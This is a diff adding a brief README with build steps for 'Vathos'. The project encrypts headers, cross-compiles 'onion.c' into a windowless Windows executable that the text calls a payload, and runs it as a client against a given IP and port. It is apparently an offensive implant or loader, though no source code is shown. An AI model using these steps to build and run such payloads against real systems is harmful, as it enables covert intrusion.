@@ -1,0 +1,19 @@
+# Vathos Build Instructions
+
+1. Generate headers
+
+Run the encryption script with the desired number of rounds and key length:
+
+python3 encrypt.py -r <rounds> -k <key_length>
+
+2. Compile the payload
+
+Use the MinGW-w64 Clang cross-compiler:
+
+x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 -Wno-deprecated-declarations onion.c -o vathos_demo.exe -Wl,-subsystem,windows
+
+3. Run the demo
+
+Execute the dmo client with:
+
+vathos_demo.exe <IP> <PORT>
